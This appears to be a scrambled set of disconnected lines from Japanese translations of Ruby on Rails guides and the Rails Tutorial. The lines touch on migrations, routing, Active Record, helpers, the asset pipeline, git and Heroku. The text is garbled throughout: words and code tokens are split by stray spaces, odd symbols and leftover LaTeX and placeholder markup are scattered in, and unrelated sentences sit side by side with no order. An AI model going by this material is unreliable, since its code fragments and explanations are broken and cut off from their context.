パスワード 再 設定 の フォーム
マイクロ ポスト を 新規 作成 する ページ
   belongs_to  : author
------------------------------------------------------------------------------
Rails の カスタム 環境 に つ い て は [ Rails 環境 を 作成 する ] ( configuring ▖ html#rails 環境 を 作成 する ) を 参照 し て くださ い 。
*  `config▖ active_ record▖timestamped_migrations ` は 、 マイグレーション ファイル 名 に シリアル 番号 と タイム スタンプ の どちら を 与え る か を 指定 し ま す 。
図 \ ref { fig :user_ model_remember_digest } の データ モデル を アプリケーション に 追加 する ため に 、 以下 の マイ グレーション を 生成 し ま す 。
以下 の よう に コンテンツ タイプ を 指定 でき る ため 、 文字 列 ベース の コンテンツ 表示 に は これ ら の オプション の 使用 が 推奨 さ れ ま す ▟ ╼
###  文字 列 から の コンテンツ 描出
すべて の 数値 は 、 以下 の メソッド に 応答 し ま す 。
{ 0 } 図 7 ▖ 17 { / 0 }   { 1 } ユーザー 登録 失敗 時 の エラー メッセージ { / 1 }
リスト \ ref{ code : db_seed } の コード で は 、 Example  User と い う 名前 と メール アドレス を 持 つ 1人 の ユーザ と 、 それ らし い 名前 と メール アドレス を 持 つ 99 人 の ユーザー を 作成 し ま す 。
ツール の 組み合わせ は 各人 の 好み や プラットフォーム に よ っ て 変わ っ て き ま す が 、 著者 が お 勧め する ツール を 以下 に ご しょうかい しま s
email _field(:user ,  :email )
Date▖ new ( 158 2 ,   10 ,   4 )   +   1 ▖ day
    has_and _belongs_to_many  : roles
   'X - Frame - Options' => ' SAMEORIGIN ',
####  「 浅 い 」 ネスト
クラウド IDE で Rails サーバー を 実行 する 。
更新 時 に 特定 の タイム スタンプ 属性 を 指定 する こと も でき ま す 。
( リスト \ ref{ code : test _helper_ log _ in } で 定義 し た デフォルト オプション と 比較 し て み て くださ い ▟ )
通常 、 親 リポジトリ は \emph {master } ブランチ と 呼 ば れ 、 トピック ブランチ   ( 短 期間 だけ 使 う 一時 的 な ブランチ )   は \ kode { checkout } と \ kode {- b } フラグ を 使 っ て 作成 でき ま す 。
SELECT  *  FROM   clients  ORDER   BY  clients ▖ id   DESC   LIMIT   1
Contact ページ の ルート を 追加 する   (  \failing   )
テスト が 正し く 失敗 し た の で 、 今度 は ユーザー 登録 の \emph { フォーム } を 作成 し て テスト に パス する よう に し ま しょ う 。
Active   Support で は 、 ` String # start _with ? ` と ` String # end_ with ? ` を 英語 的 に 自然 な 三 人 称 ( starts、 end s ) に し た 別名 も 定義 し て あ り ま す 。
デフォルト は ` :utc ` で す 。
Date▖ new (2010 ,   1 ,   31 ) ▖ change ( month :   2 )
1   row  in set   ( 0 ▖ 0 0   sec )
チュートリアル の 各章 の 最後 に は 演習 問題 を 配置 し ま し た ▟ 必須 で は あ り ま せ ん が 、 挑戦 を お すすめ し ま す 。
/photos/make
ページ ネーション の テスト 。
( 開発 サーバー の ログ ・ ファイル に 出力 さ れ た SQL 文 を 調べ る こと で 、 この こと を 確認 でき ま す ) 。
これ は リスト \ ref{ code : generalized_authenticated_p } で 使用 さ れ て い ま し た 。
*  `config▖ active_ record ▖ lock _optimistically ` は 、 Active   Record で 楽観 的 ロック (optimistic   locking ) を 使用 する か どう か を 指定 し ま す ▟ デフォルト は true ( 使用 する ) で す 。
#   現在 の 月 を デフォルト 値 に 持 つ セレクト ボックス を 生成 する
##### ` advance `
*   定数 、 特に クラス 名 および モジュール 名
エラー メッセージ の 表示 方法 は アプリケーション ごと に 異な る ため 、 Rails で は これ ら の メッセージ を 直接 生成 する ビュー ヘルパー は 含 ま れ て い ま せ ん 。
` offset ` メソッド は 、 関連 付け を 使用 し て オブジェクト を 取得 する 際 の 開始 オフセット を 指定 し ま す 。
#   # => < img   alt = " Icon "   src= "/assets/icon ▖ png "  />
$ bun dle   exec   rake   test ╼ 3   tests ,   6   assertions ,   0   failures ,   0   errors ,   0   skips
\ kode {relationships } テーブル を 作成 する ため に 、 いつ も の よう に データベース の マイ グレーション を 行な っ て テスト データベース を 準備 し ま しょ う 。
end _of_ hour
今後 は URL プレフィックス の 上書き を 回避 する ため に ` default _url_options [ : script_name ] ` を 設定 する 必要 は あ り ま せ ん 。
安全 で な い 引数 は 追加 時 に エスケープ さ れ ま す 。
ソース の ファイル 名 に 拡張 子 ` ▖ js ` が な い 場合 は 自動 的 に 補 わ れ ま す 。
{ 0 } リスト 2 ▖ 2 { / 0 } ╼╼ { 1 } Rails ルート で 使用 する Users リソース 用 の ルール { 2 } { / 2 }   { 3 } config/ routes▖rb { / 3} { / 1 }
（ この 時点 で は 、 関連 付け られ た マイクロ ポスト の 破棄 を 実装 し て い な い の で 、 上 の コード は 動作 し ま せ ん ▟ 原理 を 説明 する ため だけ に 書 い て い ま す ▟ ）
### `errors [ : base ] `
続 い て この 変更 を コミット し 、 Heroku に プッシュ し ま す 。
サポート さ れ て い る フォーマット は 電話 番号 、 通貨 、 パーセント 、 精度 、 座標 、 ファイル サイズ など で す 。
footer 用 の パーシャル
リスト \ ref{ code : create_destroy _micropost _tests } の テスト に パス する ため に は 、 少し アプリケーション 側 の コード を リファクタリング し て お く 必要 が あ り ま す 。
` : start _ year ` キー と ` : end_ year ` キー を ` options ` に 設定 する こと で 、 デフォルト の 5 年 を 変更 でき ま す 。
\ kode {rake   test : prepare } を 実行 し て テスト 環境 用 データベース を 用意 し た の で 、 テスト は パス する はず で す 。
#   すべて の ユーザー の コレクション を 返 す
{p 0 } で 少し 触れ た { 2 }errors▖ full _messages{ / 2 } オブジェクト は 、   エラー メッセージ の 配列 を 持 っ て い ま す 。
{ 0 } 図 1 � 1 ▖ 4 { / 0 }   { 1 } マイクロ ポスト が 表示 さ れ た プロフィール ページ の モックアップ { / 1 }
    has_many : countries
//= require   sub /something
<%= button_to  " An   article " , @ article ,   remote:  true   %>
config▖ mid dleware ▖ delete   " ActionDispatch : : Flash "
\emph { 期待 どおり } の 条件 と な り ま す ▟ そして 条件 が 満た さ れ る と リスト { p 1 } の { 3 } password _ reset_expired ? { / 3 } メソッド が 実行 さ れ ま す
新規 作成 さ れ た Rails アプリケーション の ディレクトリ 構造
#### `stylesheet_link_tag ` を 使用 し て CSS ファイル に リンク する
self を 省略 し た 結果 を リスト \ ref{ code : test _bcrypt_ cost _factor } に 示 し ま す 。
この コード は リスト \ ref{ code :hello_ action } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
この コード は リスト \ ref{ code : login_create_user_ instance } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
|  ** Informational **   |   100                | : continue                         |
リスト \ ref{ code : default _root _ route } に 示 し た よう に 、 Rails の ルーティング ファイル   ( \kode {config/ routes▖rb } )   に は 、 ルート ルーティング の 構成 方法 が コメント 行 に 示 さ れ て い ま す 。
リスト \ ref{ code :email_downcase } の 、 メール アドレス を 小 文字 に 変換 する コード に 対 する テスト を 、 リスト \ ref{ code :email_downcase _test } に 示 さ れ て い る よう に 作成 し て くださ い 。
\ kode {before_create } コール バック を 使用 し て \ kode {remember_token } 属性 を 作成 する 。
これ ら の 機能 が 必要 な 場合 は ` rails - observers`   gem を 追加 し て くださ い 。
Rails の 関連 付け   ( association )   で は 、 関連 付け られ た クラス に デフォルト で 対応 する 名前 を 求め る 時 に この メソッド が 使用 さ れ ま す 。
* `: words_connector ` :   3 つ 以上 の 要素 を 接続 する 場合 、 最後 の 2 つ の 間 以外 で 使 わ れ る 接続 詞 を 指定 し ま す 。
アセット パイプライン の 使用 方法
クエリ 文字 列 は 、 キャッシュ 無効 化 が 発生 する 一部 の CD N で は 役 に 立 ち ま せ ん 。
作成 し た コード を リスト \ ref{ code : users _link } に 示 し ま す
以下 の 結果 を 生成 し ま す 。
この 時点 で Heroku に アプリ を プッシュ し て も よ い で しょ う 。
{ 0 } 図 11 ▖ 3 { / 0 }   { 1 } User と その Micropost は \ kode { has_many}   ( 1 対 多 )   の 関係 性 が あ る { / 1 }
成功 し た テスト スイート を 流用 し て 、 今度 は 少し 難し い 、 メール アドレス の フォーマット 検証 作業 に 取りかか り ま しょ う 。
この 「 隠れ た 」 \ kode { input } タグ は 、 関連 する 情報 を ページ に 置 き ながら 、 それ ら を ブラウザ 上 で 非 表示 に し ま す 。
# =>  Sun ,   0 8   Aug  2010   21 : 0 0 : 0 0   UTC   + 0 0 : 0 0
以下 の ` Application Controller ` レイアウト が あ る と し ま す 。
$  git   rebase   - i
####   複数 の 関連 付け の 配列
たとえば 、 以下 の 2 つ の image_tag ヘルパー は 同じ コード を 返 し ま す 。
  #< Client   id :   1 ,   first _ name :  " Lifo " > ,
{ 0 } 図 8 ▖ 2 { / 0 }   { 1 } ログ イン 失敗 時 の モックアップ { / 1 }
今度 は U の 部分 、 つまり 記事 の 更新 を 実装 し て み ま しょ う 。
3   番 目 の 問題 に つ い て は 、 Rails に よ っ て 自動 的 に 対策 が 行 わ れ ま す ▟ 具体 的 に は 、 ビュー テンプレート で 入力 し た 内容 を すべて 自動 的 に エスケープ し ま す 。
アカウント 有効 化 と パスワード 復旧 の 最大 の 山場 で あ る この セクション で は 、 いよいよ production   ( 本番 )   環境 で アプリケーション から メール を 送信 し ま す 。
{ 0 } 表 11 ▖ 1 { / 0 }   { 1 } user/micropost 関連 メソッド の まとめ { / 1 }
###  ルーティング
\ label{ fig : signup_success_mockup}}╼\end { figure} ╼╼    \ subsection { 登録 フォーム の 完成 }  %  ( fold) ╼    \ label{ sec : the_finished_ signup _ form }╼ ╼
この 問題 を 修正 する に は 、 \ kode {authenticated ? } が \ kode {false } を 返 す よう に する 必要 が あ り ま す 。
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } で は 、 この \ kode {authenticate } メソッド を 使 っ て ログ イン する 方法 を 解説 し ま す 。
エンジン を 生成 する に は 、 プラグ インジェネレータ を 実行 し 、 必要 に 応 じ て オプション を ジェネレータ に 渡 し ま す 。
\ href { http://railscasts▖ com/}{ RailsCasts} (Ryan   Bates) :   さっき も   \ href { http://railscasts▖ com/}{ RailsCasts}   を 紹介 し ま し た っけ ？
| ` smtp_settings`|`: smtp ` の 配信 メソッド の 詳細 設定 を 行 い ま す 。
次 の 節 で も お 見せ し ま す が 、 これ に よ っ て 、 以下 の よう に マイクロ ポスト 用 の ファクトリー を 定義 でき る よう に な り ま す 。
バリデーション を 厳密 に し 、 オブジェクト が 無効 だっ た 場合 に ` ActiveModel : : StrictValidationFailed ` が 発生 する よう に する こと が でき ま す 。
assert_ generates '/about ' , controller :  ' pages',   action :  'about '
既に アプリケーション 側 の コード は 実装 し て あ る の で 、 この テスト は   \ passing \   する はず で す 。
( \ ref{ sec : version_control } で \ kode {co } エイリアス を 設定 し た 場合 は 、 \ kode { git  co  - b   modify - README } と 入力 する こと も でき ま す ) 。
#   If  you  are   not   u sing   ActiveRecord ,   you  can   remove  this   line ▖
beginning _ of_month   ( at_beginning _ of_month )
{ 0 } 図 1 ▖ 6 { / 0 } { 1 } アカウント 作成 直後 の GitHub ページ ▟ \ href { http://railstutorial ▖org / images/figures /create_first _ repository _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
ログ インフォーム で 入力 し た 情報 に 誤り が あ っ た とき は 、 ログ イン ページ を もう 一 度 表示 し て エラー メッセージ を 出力 し ま す   ( 図 \ ref { fig: login_failure_mockup } ) 。
Active   Record で バリデーション が 行 わ れ た 後 は 、 `errors ▖ messages ` インスタンス メソッド を 使用 する と 、 発生 し た エラー に アクセス でき ま す ▟ この メソッド は エラー の コレクション を 返 し ま す 。
<% =  ren der   partial :   " link_ area " ,   layout :  "graybar "  %>
` Article# summary ` を * * オーバーライド * * する 場合 :
モデル 、 ビュー 、 コントローラ 、 ヘルパー など を 含 む 主要 な アプリケーション コード
この メソッド に ファイル 名 を 引数 と し て 渡 す と 、 書き込み 用 に オープン さ れ た ファイル ハンドル を 生成 し ま す 。
ただし Web TV や Mac 版 IE   5 ▖ 5 など の 古 い ブラウザ で は 、 ページ 上 で の 読み込み に 失敗 し ま す 。
$ bun dle   exec   rake   test ╼ Abstract Controller : : Action NotFound : ╼ The   action  'about '  could   not   be   found   for   StaticPages Controller
<%=   form _ for  @ person ,  url:  { action :  " create " }   do  | f| %>
   port:                  58 7 ,
たとえば 、 `@ article ▖ update( title :  'A   new title') ` を 実行 し た 場合 、 Rails は `title ` 属性 のみ を 更新 し 、 それ 以外 の 属性 は 変更 し ま せ ん 。
「 “ deified ” 」 と い う 単語 は 回文 で あ る
&lt;html &gt; &lt; font  color = red &gt ;hey&lt; / font& gt; &lt;/html &gt;   [ 任意 の 邪悪 な 入力 が
他 の ビュー へ の リンク も 作成 し て み ま しょ う ▟ " New   Article " リンク を ` app/views/articles/index▖html ▖erb ` に 追加 し 、 `<table > ` タグ の 上 に 置 き ま す 。
純粋 な Ruby 言語 で あ れ ば 、 これ ら の メソッド は 何 も 実行 し ま せ ん 。
ログ イン し た ユーザー 向け の レイアウト で あ れ ば 、 ナビゲーション ツール バー を ページ の トップ レベル に 表示 し 、 多く の コントローラ / アクション で 共通 し て 使用 でき る よう に する で しょ う 。
例 と し て 、 以下 の よう な ルーティング が あ る と し ま す 。
100 ▖ to_s(:percentage ,   precision :   0 )
### `indent `
この 時点 で 、 Toy アプリケーション を \ ref{ sec : deploying } の よう に Heroku に 展開 し て も かま い ま せ ん 。
ただし 文字 列 と 違 っ て 、 全て の 文字 が 使え る わけ で は な い こと に 注意 し て くださ い
リスト \ ref{ code :hello_ action } の コード と リスト \ ref{ code :hello_ root _ route } の コード を 使用 する と 、 ルート ルーティング から 「 hello ,   world ! 」 が 返 さ れ る よう に な り ま す 。
でき れ ば 、 `▖travis▖yml ` に 記載 さ れ て い る バージョン の Ruby を 使用 し て バック ポート を ローカル で テスト し て から プルリクエスト を 送信 する よう に し て くださ い 。
これ は リスト \ ref{ code : real _user_fixture } で 使用 さ れ て い ま し た 。
   alias _ method  : process _without_stringified_params ,  : process
そして 、 アプリケーション 側 の コード は 実装 済み な の で 、 これ ら の テスト は \ passing する はず で す 。
` has _one ` 関連 付け は 他 の モデル と 1 対 1 対応 し ま す 。
この メソッド を 使 う と 今 まで の
`option ` タグ の 文字 列 を 返 し ま す ▟ 後述 の ` options _ from_collection_for_select ` と 似 て い ま す が 、 引数 の オブジェクト リレーション に 基 い て ` optgroup ` タグ を 使用 する 点 が 異な り ま す 。
category   =   Category ▖ first
新し い オブジェクト を 検索 また は ビルド する
Rails 全体 を 高度 な レベル で 概観 でき た
  $ rails server   --environment   production
この 問題 を 修正 する に は 、 \ kode { clang } フラグ を 追加 し て RVM を 再 インストール し ま す 。
リスト \ ref{ code : will _ paginate_ index_ view } の ユーザー 一覧 画面 の コード と 比較 する と 、 少し 違 っ て い ま す ▟ ▟ 以前 は 次 の よう に 単純 な コード で し た 。
スタイル を 追加 し た 結果 を 図 \ ref { fig : site_with _ footer } に 示 し ま す 。
  #  Calls   + to _ param +   on   all  its elements  and   joins   the   result   with
ユーザー 一覧 ページ の 完全 な リファクタリング  
###  ブランチ を 更新 する
たとえば 、 ` stringify _keys ` と `symbolize_keys ` で は 、 キー の 変換 に ` transform _keys ` を 使用 し て い ま す 。
\ kode { from _users _ followed_by } の 最初 の 実装 。
フォーム の 更新 が 終わ っ た の で 、 今度 は これ に 対応 する Relationships コントローラ を 改造 し て 、 Ajax リクエスト に 応答 でき る よう に し ま しょ う 。
$ bun dle   exec   rake   test ╼ $  git   push╼ $  git   push   heroku╼$   heroku run  rake   db : migrate
クラス や モジュール に 対 し て ` : nodoc: ` を 指定 し た 場合 、 その 中 の すべて の メソッド は 内部 API で あ り 、 直接 アクセス する こと は 許 さ れ な い こと が 示 さ れ ま す 。
先ほど と 同様 に \ kode {static _ pages_controller▖ rb } と い う コントローラ が 生成 さ れ ま す 。
   name  =  name ▖ camelize  if  camelize ?
Rails アプリケーション で メール を 受信 でき る よう に する ため に は 、 以下 の 作業 が 必要 に な り ま す 。
form _ for の よう な 特定 の モデル オブジェクト の 外側 に スコープ を 作成 し ま す が 、 フォーム タグ 自体 は 作成 し ま せ ん 。
ローカル の Rails サーバー で は console の デフォルト の 環境 と し て \ texttt { development } が 使用 さ れ ま す が 、 以下 の よう に 他 の 環境 で console を 実行 する こと も でき ま す 。
paintIt  = ( element ,   backgroundColor ,   text Color )   ->
( リスト \ ref{ code : log _ in_password _ resets } と 図 \ ref { fig : forgot_ password _ link } 参照 )
Web アプリケーション を 作成 する とき に 、 ユーザー インターフェイス の 概要 を でき る だけ 早 い うち に 把握 し て お く こと が しばしば 有用 で す 。
* =  require_ self
Rails と は 、 Ruby プログラミング 言語 の 上 で 動作 する Web アプリケーション フレームワーク で す 。
1000 ▖ to_s(:percentage ,   delimiter :  '▖', separator :  ',')
# =>  Mon ,   09   Aug  2010   23 : 15 : 17   + 0000
HTTP リクエスト
ブラウザ から の リクエスト で `/photos/ show / 1 ? user_ id= 2 ` と い う パス が 渡 さ れ る と 、 ` Photos ` コントローラ の ` show ` アクション に 割り当て られ ま す 。
` since ` メソッド は 、 同様 に その 秒数 だけ 先 に 進 み ま す 。
つまり 、 以下 の コード の 場合 、
` : as ` オプション に ` true ` を 設定 する と 、 ポリ モー フィック 関連 付け を 指定 でき ま す 。
  $ rails  console
Client▖unscoped {
この メソッド は ` Time▖now ` と 似 て い ま す が 、 ユーザー 定義 の タイム ゾーン が あ る 場合 に それ を 考慮 する 点 が 異な り ま す 。
ジョブ を 作成 する
             action :  'greeting ')  %>
` : json ` オプション が 指定 さ れ て い れ ば 、 ` ren der ` に よ っ て ` to_json ` が 自動 的 に 呼び出 さ れ る よう に な っ て い ま す 。
通常 の ERB ビュー を 使用 し て くださ い 。
|   id   | select_type | table | type  |  possible_keys  |
User ▖ update_all  " max _ login_attempts  =   3 ,   must _ change_ password   = 'true ' "
この 設定 は ` config▖ action_dispatch ▖ip_spoofing _ check ` オプション と ` config▖ action_dispatch ▖ trusted_proxies ` オプション で 変更 可能 で す 。
変更 の 結果 を リスト \ ref{ code :jquery _ file_test } に 示 し ま す 。
ユーザー プロファイル ページ の 最終 的 な 目標 は 、 図 \ ref { fig : profile_mockup } の よう に { p 2 } ユーザー の プロファイル 写真 と 基本 ユーザー データ 、 そして マイクロ ポスト の 一覧 を 表示 する こと で す 。
ガイダンス に つ い て は [ アセット を プリ コンパイル する ] ( # アセット を プリ コンパイル する ) を 参照 し て くださ い 。
` attr_ internal ` マクロ は ` attr_ internal _accessor ` と 同義 で す 。
この メソッド は 内部 で ` image_ path ` を 呼び出 し て お り 、 現在 の ホスト また は アセット 用 の ホスト と マージ し て URL を 生成 し ま す 。
{ 0 } { 1 } リスト 4 ▖ 1 { / 1 } { / 0 } の 以下 の 行 に ご 注目 くださ い 。
ファイル の 内容 が 更新 さ れ る と 、 フィンガー プリント も 更新 さ れ ま す 。
リスト \ ref{ code : palindrome_tester } の とき
返 さ れ る クラス の 順序 は 一定 で は あ り ま せ ん 。
\ kode {user } に \ kode {michael } と い う 値 を 渡 す と 、 Rails は fixture ファイル 内 の 対応 する ユーザー を 探し出 し て 、 ( もし 見つか れ ば )   マイクロ ポスト に 関連 付け て くれ ま す 。
   def  self ▖ published
次 に 、 Spork の 設定 に bootstrap を 指定 し ま す 。
\ kode {Users Controller } クラス に おけ る 継承 。
Asset   Pipeline 互換 の 行 を 追加 する 。
( 4 ▖months  +   5 ▖ years) ▖ from _now
最初 は \ kode { count } メソッド を 紹介 し ま す ▟ これ は エラー の 数 を 返 し ま す 。
この 類 の エンド ツー エンド テスト は 、 アプリケーション の 重要 な 機能 を カバー し て くれ て い ま す ▟ こう い っ た 理由 が 統合 テスト が 便利 だ と 呼 ば れ る 所以 で す 。
   class  Engine  < : : Rails : : Engine
Spork   is   ready  and   listening   on   89 8 9 !
楽観 的 ロック を 使用 する に は 、 テーブル に ` lock_ version ` と い う 名前 の integer 型 カラム が あ る 必要 が あ り ま す 。
この バリデーション は 、 モデル の テーブル に 対 し て 、 その 属性 と 同じ 値 を 持 つ 既存 の レコード が あ る か どう か を 調べ る SQL クエリ を 実行 する こと に よ っ て 行 わ れ ま す 。
false に 設定 する と 、 Customer クラス が 使用 する テーブル 名 は 単数 形 の ` customer ` に な り ま す 。
上 の コード で は 、 よく 使 わ れ る 以下 の よう な 構造 が 使用 さ れ て い ま す が 、 少し 紛らわし い 点 が あ り ま す 。
</ul>
@assembly  = @ part ▖ assemblies▖build ( { assembly_ name :  " Transmis sion   housing " } )
<%=  image_tag   " icons/ delete ▖ gif " ,  {height :   45 }  %>
エンジニアリング 記法 も 従来 通り サポート さ れ ま す 。
有効 な ユーザー だけ を 表示 する コード の テンプレート
< http://local host : 3000/articles/new > を ブラウザ で 再 表示 する と 、 ページ に タイトル が 表示 さ れ る よう に な り ま し た 。
ただし 、 ` inverse _of ` の サポート に は いく つ か の 制限 が あ り ま す 。
     following
Ajax を 使 っ た フォロー フォーム
orders▖build ( attributes = {}, ▖▖▖)
\ href { http://rvm▖io /rvm/install/ }{ RVM を インストール } し て あ れ ば 、 既に RubyGems も 同時 に インストール さ れ て い る はず で す 。
#   認証 トークン を remote フォーム に 埋め込 む
検索 キー
*   Rails アプリケーション の 動作 を 調整 する 方法
マイグレーション を コピー する 必要 の あ る エンジン が いく つ も あ る 場合 は 、 代り に ` railties:install : migrations ` を 使用 し ま す 。
ファイル の コピー が CD N に な い 場合 、 CD N は   " origin "   ( この 場合 ` example ▖ com/assets/smile▖ png ` )   を 探 し て 今後 の ため に 保存 し て お き ま す 。
real 	 0 m 8 ▖ 633 s
この カラム は 、 [ Active   Record マイグレーション ] ( migrations ▖html ) を 使用 し て テーブル を 作成 する とき に 自動 的 に 作成 さ れ ま す 。
( 10 ▖ 57   の コード に あ る \ kode { response ▖ body } は 、 その ページ の HTML 本文 を すべて 返 す メソッド で す ) 。
前回 同様 、 \ kode {will\_ paginate } メソッド を 使 う と 次 の よう に な り ま す 。
次 に master ブランチ に マージ バック し ま す 。
` app/assets/stylesheets ` に 置 か れ て い る スタイル シート アセット へ の パス を 算出 し ま す 。
\ kode {content_tag } を 使 っ て レイアウト の 中 に \ kode {flash } を 埋め込 む
      <style ><%= yield  :stylesheets %></style >
         self ▖ author   =  User ▖find_or_create_by ( name :   author_ name )
=> " raboof "
サイド バー で マイクロ ポスト の 投稿 数 を テスト する ため の テンプレート
これ は リスト \ ref{ code :correct_ signin_failure } で 使用 さ れ て い ま し た 。
`find_or_ initialize_by ` メソッド は ` find_or_create_by ` と 同様 に 動作 し ま す が 、 ` create ` の 代り に ` new ` を 呼 ぶ 点 が 異な り ま す 。
##### `distinct `
単純 な スコープ を 設定 する に は 、 クラス の 内部 で ` scope ` メソッド を 使用 し 、 スコープ が 呼び出 さ れ た とき に 実行 し て 欲し い クエリ を そこ で 渡 し ま す 。
ユーザー 属性 の 「 名前 」 と 「 メール アドレス 」 に 対 し て バリデーション を 追加 し た の で 、 最後 の 砦 で あ る 「 セキュア な パスワード 」 に 取り掛か り ま す 。
認証
mail   =  mail ▖ deliver_now            #  " Called " を 出力 する
これ で 、 \ ref{ sec : rails_server } で 説明 し た とおり に ローカル サーバー が 動作 する はず で す
self を 省略 し た 結果 を リスト \ ref{ code : fixture_ second _user } に 示 し ま す 。
|                     |  42 6                |  : upgrade _required                 |
\ ref{ sec : custom_static _ pages } で サンプル アプリ の Home ページ と Help ページ を 作成 し て 中身 も 書き加え た の で 、 今度 は About ページ を 同様 に 追加 し ま す 。
#### `find_ in_batches`
###  AtomFeedHelper
Rails と Rack
$  rake  rails : update
幸い 、 \ kode {:uniqueness で は \ kode {: case_sensitive } と い う 打ってつけ の オプション が 使用 でき ま す   ( リスト \ ref{ code : validates_uniqueness _of_email _ case _ insensitive } } ) 。
この ルーティング を 常 に エンジン の ` articles_ path ` ルーティング ヘルパー メソッド で 取り扱 う よう に し た い 場合 、 以下 の よう に エンジン と 同じ 名前 を 共有 する ルーティング プロキシ メソッド を 呼び出 す 必要 が あ り ま す 。
#   管理 者 か どう か 確認
{ 0 } 図 7 ▖ 19 { / 0 }   { 1 } ユーザー 登録 に 成功 し た 画面 の モックアップ { / 1 }
class   Comment <  ActiveRecord : : Base
vendor/assets/javascripts/slider ▖ js
*   アクション 側 で 受け取 る パラメータ
Rails で [ アセット パイプライン ] ( asset_pipeline ▖html )   を 有効 に し て い る 場合 、 Java Script へ の リンク 先 は 旧 Rails の ` public /javascripts ` で は な く `/assets/javascripts/` に な り ま す 。
#   クエリ の 実行 計画   ( クエリプラン )   を 現在 より 多 く 出力 する
この 出力 は デフォルト の まま で は 整形 さ れ て い ま せ ん 。
###   合計
Postgre SQL の Prepared   Statements は デフォルト で オン に な り ま す 。
INFO :   以下 の メソッド は 可能 で あ れ ば ` Time ` オブジェクト を 返 し 、 それ 以外 の 場合 は ` DateTime ` を 返 し ま す 。
本章 で は 、 アプリケーション で 使用 さ れ て い る Ruby   on   Rails の バージョン を 、 新し い バージョン に アップグレード する 際 の 手順 に つ い て 示 し ま す 。
`find_or_create_by ` の 例 を 少し 変え て 説明 を 続け ま す ▟ 今度 は ' Nick ' と い う 名前 の クライアント が 必要 だ と し ま す 。
$  git   checkout   master
これ は リスト \ ref{ code : production_webserver_config } で 使用 さ れ て い ま し た 。
####  Passenger を 使用 する
╼╼\ subsection { 本章 の まとめ }  %  ( fold) ╼\ label{ sec :static _ pages_ what _we_learned_ in_this _ chapter }╼╼\ begin {itemize}╼╼\item 
###  自己 結合
この ジェネレータ 呼び出し で は 必要 な モデルファイル だけ が 生成 さ れ ま す ▟ さらに ` blorgh ` ディレクトリ の 下 で 名前 空間 化 さ れ 、 `Blorgh : : Comment ` と い う モデル クラス も 作成 さ れ ま す 。
-------------------------
レスポンス 分割 と は 、 ヘッダー フィールド に 2 つ の CRLF を 注入 し 、 その 後ろ に 邪悪 な HTML を 配置 する と い う 手法 で す 。
逆 に エンジン 内部 から アプリケーション を 参照 する 場合 は 、 同じ 要領 で `main_app ` を 使用 し ま す 。
# =>  Bold  no  more !   
     module  Blorgh
    <body >
TIP :   出力 する オブジェクト に 対 し て ` to _xml ` を 呼び出 す 必要 は あ り ま せ ん 。
カウンタ キャッシュ 用 の カラム は 、 ` attr_readonly ` に よ っ て 読み出し 専用 属性 と な る モデル の リスト に 追加 さ れ ま す 。
これ は オプション の ハッシュ を 引数 に 取 り 、 以下 の どの オプション で も 含め る こと が でき ま す 。
\ texttt { let } メソッド
\ kode { Application Controller } クラス に おけ る 継承  
*  `head ` を 呼び出 し 、 HTTP ヘッダー のみ で 構成 さ れ た レスポンス を 作成 し て ブラウザ に 送信 する
` in ? ` の 例 を 示 し ま す 。
これ は リスト \ ref{ code :relationship_create_test } で 使用 さ れ て い ま し た 。
たとえば 、 リスト \ ref{ code :universal_css } で は 、 以下 の よう に \ kode {▖center } と \ kode {▖center   h 1 } の 両方 に 対 し て ルール が あ り ま す 。
この 手法 を 一般 に   _ キャッシュ 破棄   ( cache busting ) _  と 呼 び ま す 。
インデックス が 付与 さ れ た Micropost の マイ グレーション
逆 リレーションシップ を 使用 し て \ kode {user ▖ followers } を 実装 する 。
一般 的 な \ kode {find } メソッド 以外 に 、 Active   Record に は 特定 の 属性 で ユーザー を 検索 する 方法 も あ り ま す 。
` joins ` メソッド の 引数 に 生 の SQL を 指定 する こと で ` JOIN ` 句 を 指定 でき ま す 。
デフォルト は ` :erb ` で す 。
User ▖ active ▖ w here ( state :  'finished')
ここ まで 来 た ら 、 テスト スイート が パス する こと を 確認 し ま しょ う 。
      t▖ string   : publisher_type
たとえば 以下 の よう な もの が あ り ま す 。
       foreign_key:  " this _user_ id " ,
つまり 、 モデル の 新し い インスタンス は 作成 さ れ ま す が 、 その 時点 で は データベース に 保存 さ れ て い ま せ ん 。
`many ? ` は 、 ブロック が オプション と し て 与え られ る と 、 true を 返 す 要素 だけ を 扱 い ま す 。
class  C
Rails は 、 production モード で は デフォルト で ` public/assets` ファイル を プリ コンパイル し ま す 。
続 い て 、 この 行 を 出力 に 含め る ため の パーシャル   ( 部分 テンプレート )   も 必要 で す 。
Object ▖qualified_const_set ( " Math : : Phi " ,   1 ▖ 6180 3 4 )  # = >   1 ▖ 6180 3 4
上 の コード は 、 データベース で 注文 の あ る 日 付 ごと に ` Order ` オブジェクト を 1 つ 作成 し ま す 。
╼╼    \ subsection { Heroku に デプロイ する   ( 1 ) } ╼    \ label{ sec : heroku_step _one }╼╼
上 の コード は 、 記事 と 、 それ に 関連 付け られ た カテゴリ や コメント を すべて 読み込 み ま す 。
   statement_ limit :   200
これ で 、 テスト を 実行 する と   \ passing   に な る はず で す 。
これ で テスト は すべて パス する はず で す
`find _each ` メソッド は 、 レコード の バッチ を 1 つ 取り出 し 、 続 い て   _ 各_  レコード を 1 つ の モデル と し て 個別 に ブロック に yield し ま す 。
Java Script を 使用 し て バリデーション を 実装 する 場合 、 ユーザー が Java Script を オフ に し て しま え ば バイパス さ れ て しま い ま す 。
\ kode {will\_ paginate } を ユーザー リスト の 上 と 下 の 両方 に 配置 し て あ る の で 、 ページ ネーション の リンク も ページ の 上 と 下 の 両方 に 表示 さ れ て い ま す 。
ログ イン 済み かどう か を 確かめ る テスト で は 、 Users コントローラ 用 の テスト が その まま 役 に 立 ち ま す   ( リスト \ ref{ code :edit _update_redirect_tests} 、 リスト \ ref{ code : action_tests_ admin } ) 。
ブロック を 渡 し た 場合 、 配列 の 要素 の うち ブロック が true を 返 す 要素 が セパレータ と し て 使用 さ れ ま す 。
###   複数 の 関連 付け を 一括 で 読み込 む
最初 に 、 お 勧め の 方法 と し て RVM を 使 う 方法 を 紹介 し ま す ▟ RVM は バージョン 1 ▖ 11 以降 から Bundler と の 統合 が 含 ま れ て い ま す 。
    This   is   the   home   page   for   the
to_ visit   <<  node  if  visited ▖exclude ? (
redirect_to   photos_ path ,  status :   30 1
